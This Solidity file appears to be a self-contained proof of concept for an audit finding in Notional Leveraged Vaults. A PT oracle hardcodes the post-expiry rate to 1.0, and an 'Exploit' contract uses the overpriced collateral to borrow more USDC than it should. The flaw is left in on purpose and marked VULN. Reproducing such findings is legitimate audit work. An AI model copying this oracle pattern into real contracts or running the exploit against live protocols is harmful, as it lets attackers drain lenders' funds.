// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Notional Leveraged Vaults — post-expiry PT rate is hardcoded to 1.0
    (Sherlock 2024-06, finding 35123, H-10).
    SYNTHETIC, cheatcode-free. The expiry ternary is the audited line.
    Root cause: after expiry, ptRate is ptDecimals (1.0) instead of Pendle's
    PT-to-SY rate. For PT-weETH that rate is 0.9598002817, because 1 PT
    redeems 1 eETH, not 1 weETH. weETH/USD is 3590e8. The oracle returns
    3590e18 instead of 3445683011303000000000, and 1 PT borrows 3590000000
    USDC units instead of 3445683011.
    PT decimals are 18, so this is not the 10**ptDecimals divisor bug.
    The market expiry is already 0, so the post-expiry branch is taken in
    this block. No timestamp change. The control uses getPtToSyRate. */

library TypeConvert {
    function toInt(uint256 x) internal pure returns (int256) {
        return int256(x);
    }
}

interface IBaseToUSD {
    function decimals() external view returns (uint8);
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
}

interface IPendleMarket {
    function readTokens() external view returns (address sy, address pt, address yt);
    function expiry() external view returns (uint256);
}

interface IERC20Decimals {
    function decimals() external view returns (uint8);
}

interface IPendleOracle {
    function getOracleState(address market, uint32 duration) external view returns (bool, uint16, bool);
    function getPtToSyRate(address market, uint32 duration) external view returns (uint256);
    function getPtToAssetRate(address market, uint32 duration) external view returns (uint256);
}

contract MiniToken is IERC20Decimals {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        name = name_;
        symbol = symbol_;
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Chainlink weETH/USD. The report's 1 July 2024 price is 3590 USD, 8 decimals.
contract BaseUsdFeed is IBaseToUSD {
    function decimals() external pure returns (uint8) {
        return 8;
    }

    function latestRoundData() external pure returns (uint80, int256, uint256, uint256, uint80) {
        return (1, 3590 * 1e8, 0, 1, 1);
    }
}

contract PendleMarket is IPendleMarket {
    address public pt;

    constructor(address pt_) {
        pt = pt_;
    }

    function readTokens() external view returns (address sy, address pt_, address yt) {
        return (address(0), pt, address(0));
    }

    /// Already expired in this block. 1 July 2024 is after 27 Jun 2024.
    function expiry() external pure returns (uint256) {
        return 0;
    }
}

/// Pendle PT oracle. Post-expiry getPtToSyRate is 0.9598002817e18, not 1e18.
contract PendleRateOracle is IPendleOracle {
    uint256 public constant REAL_SY_RATE = 959800281700000000;

    function getOracleState(address, uint32) external pure returns (bool, uint16, bool) {
        return (false, 0, true);
    }

    function getPtToSyRate(address, uint32) external pure returns (uint256) {
        return REAL_SY_RATE;
    }

    function getPtToAssetRate(address, uint32) external pure returns (uint256) {
        return REAL_SY_RATE;
    }
}

contract PendlePTOracle {
    using TypeConvert for uint256;

    address public immutable pendleMarket;
    uint32 public constant twapDuration = 1800;
    bool public immutable useSyOracleRate;

    uint8 public constant decimals = 18;
    int256 public constant rateDecimals = 10**18;

    IBaseToUSD public immutable baseToUSDOracle;
    int256 public immutable baseToUSDDecimals;
    int256 public immutable ptDecimals;
    bool public constant invertBase = false;
    address public constant sequencerUptimeOracle = address(0);
    IPendleOracle public immutable pendleOracle;
    uint256 public immutable expiry;

    constructor(
        IPendleMarket pendleMarket_,
        IBaseToUSD baseToUSDOracle_,
        IPendleOracle pendleOracle_,
        bool useSyOracleRate_
    ) {
        pendleMarket = address(pendleMarket_);
        baseToUSDOracle = baseToUSDOracle_;
        pendleOracle = pendleOracle_;
        useSyOracleRate = useSyOracleRate_;

        uint8 _baseDecimals = baseToUSDOracle_.decimals();
        (/* */, address pt, /* */) = pendleMarket_.readTokens();
        uint8 _ptDecimals = IERC20Decimals(pt).decimals();

        require(_baseDecimals <= 18);
        require(_ptDecimals <= 18);

        baseToUSDDecimals = int256(10**_baseDecimals);
        ptDecimals = int256(10**_ptDecimals);

        (bool increaseCardinalityRequired,, bool oldestObservationSatisfied) =
            pendleOracle_.getOracleState(pendleMarket, twapDuration);
        require(!increaseCardinalityRequired && oldestObservationSatisfied, "Oracle Init");

        expiry = pendleMarket_.expiry();
    }

    function _getPTRate() internal view returns (int256) {
        uint256 ptRate = useSyOracleRate
            ? pendleOracle.getPtToSyRate(pendleMarket, twapDuration)
            : pendleOracle.getPtToAssetRate(pendleMarket, twapDuration);
        return ptRate.toInt();
    }

    function latestAnswer() external view returns (int256 answer) {
        (, int256 baseToUSD,,,) = baseToUSDOracle.latestRoundData();
        require(baseToUSD > 0, "Chainlink Rate Error");

        // Past expiration, hardcode the PT oracle price to 1. It is no longer tradable and
        // is worth 1 unit of the underlying SY at expiration.
        // @> VULN: post-expiry rate is ptDecimals (1.0), not Pendle's 0.9598002817 PT-to-SY rate
        int256 ptRate = expiry <= block.timestamp ? ptDecimals : _getPTRate();

        answer = (ptRate * baseToUSD * rateDecimals) / (baseToUSDDecimals * ptDecimals);
    }
}

contract LeveragedVault {
    PendlePTOracle public oracle;
    MiniToken public pt;
    MiniToken public usdc;
    mapping(address => uint256) public collateral;

    constructor(PendlePTOracle oracle_, MiniToken pt_, MiniToken usdc_) {
        oracle = oracle_;
        pt = pt_;
        usdc = usdc_;
    }

    function deposit(uint256 amount) external {
        pt.transferFrom(msg.sender, address(this), amount);
        collateral[msg.sender] += amount;
    }

    function quoteBorrow(int256 price, uint256 ptAmount) public pure returns (uint256) {
        uint256 usd18 = ptAmount * uint256(price) / 1e18;
        return usd18 / 1e12;
    }

    function borrowMax() external returns (uint256 limit) {
        limit = quoteBorrow(oracle.latestAnswer(), collateral[msg.sender]);
        usdc.transfer(msg.sender, limit);
    }
}

contract Exploit {
    int256 public constant BUGGY_PRICE = 3590000000000000000000;
    int256 public constant FAIR_PRICE = 3445683011303000000000;
    uint256 public constant BUGGY_BORROW = 3590000000;
    uint256 public constant FAIR_BORROW = 3445683011;
    uint256 public constant ONE_PT = 1e18;
    uint256 public constant REAL_SY_RATE = 959800281700000000;

    BaseUsdFeed public feeds; // nonce 1
    MiniToken public pt; // nonce 2
    MiniToken public usdc; // nonce 3
    PendleMarket public market; // nonce 4
    PendleRateOracle public pendle; // nonce 5
    PendlePTOracle public oracle; // nonce 6
    LeveragedVault public vault; // nonce 7

    uint256 public borrowed;
    int256 public price;

    constructor() {
        feeds = new BaseUsdFeed();
        pt = new MiniToken("PT weETH 27JUN2024", "PT-weETH", 18);
        usdc = new MiniToken("USD Coin", "USDC", 6);
        market = new PendleMarket(address(pt));
        pendle = new PendleRateOracle();
        oracle = new PendlePTOracle(IPendleMarket(address(market)), feeds, pendle, true);
        vault = new LeveragedVault(oracle, pt, usdc);
        pt.mint(address(this), ONE_PT);
        usdc.mint(address(vault), 10_000_000_000);
    }

    function run() external {
        uint256 realRate = pendle.getPtToSyRate(address(market), 1800);
        pt.approve(address(vault), ONE_PT);
        vault.deposit(ONE_PT);
        price = oracle.latestAnswer();
        borrowed = vault.borrowMax();
        require(oracle.expiry() == 0, "not expired");
        require(oracle.ptDecimals() == int256(1e18), "18 decimal PT");
        require(realRate == REAL_SY_RATE, "real sy rate");
        require(price == BUGGY_PRICE, "hardcoded 1.0 price");
        require(borrowed == BUGGY_BORROW, "borrow");
        require(borrowed > FAIR_BORROW, "not above the real-rate borrow");
        require(usdc.balanceOf(address(this)) == BUGGY_BORROW, "received");
    }
}
